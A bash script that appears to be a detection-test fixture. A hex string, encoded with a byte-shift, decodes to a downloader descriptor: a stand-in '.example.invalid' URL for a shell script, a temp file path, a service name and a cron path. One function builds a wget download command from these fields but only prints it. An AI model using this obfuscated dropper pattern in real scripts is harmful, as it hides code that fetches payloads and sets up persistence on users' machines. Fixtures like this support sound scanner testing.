#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_e1687eab='62291d685f60515c5f294d4f5d61555e514b5e51595b605118635e5560514b52555851684d504d5c60515e29635351604b5b61605c6160685f604d53514b4f5b615a60291d684f4d595c4d55535a4b5550294f4d595c4d55535a19234f1c514f1d1e21235268615e58295460605c5f261b1b234f1c514f1d1e2123521a51644d595c58511a555a624d5855501b2421241d1f1e221d1a5f5468615f515e4b4d53515a602934615a605e515f5f384d4e1b234f1c514f1d1e21235268525558514b5c4d6054291b60595c1b54615a605e515f5f194f4d4f54511b1a5f604d535119234f1c514f1d1e212352'
readonly Codec_e1687eab='hex_compact|subtract_modulo_256|14'

Load_e1687eab() {
  item1=()
  local raw="${Material_e1687eab}" item5
  for ((item5=0; item5<${#raw}; item5+=2)); do item1+=("$((16#${raw:item5:2}))"); done
}

Decode_e1687eab() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$(((item1[item5] + 20) % 256))")
  done
}

Recover_e1687eab() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_e1687eab
  case 1 in 1) Decode_e1687eab ;; *) return 70 ;; esac
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_e1687eab() { local recovered field; local -a fields; recovered="$(Recover_e1687eab)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_e1687eab() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_e1687eab)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_e1687eab; fi
